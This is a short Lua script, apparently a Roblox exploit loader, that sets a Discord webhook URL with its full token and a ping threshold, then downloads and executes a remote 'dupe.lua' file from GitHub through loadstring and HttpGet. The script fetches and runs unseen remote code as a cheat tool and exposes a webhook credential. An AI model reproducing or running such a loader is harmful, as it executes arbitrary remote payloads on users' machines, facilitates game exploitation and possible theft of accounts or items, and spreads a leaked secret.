local Webhook = "https://discord.com/api/webhooks/1435768207616118835/SyAy1CWLvem9ZgvKPmquGsfvBs5sThezweCnLYxuk9kxYr32lQGSModvyvWBWTdI75um"

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
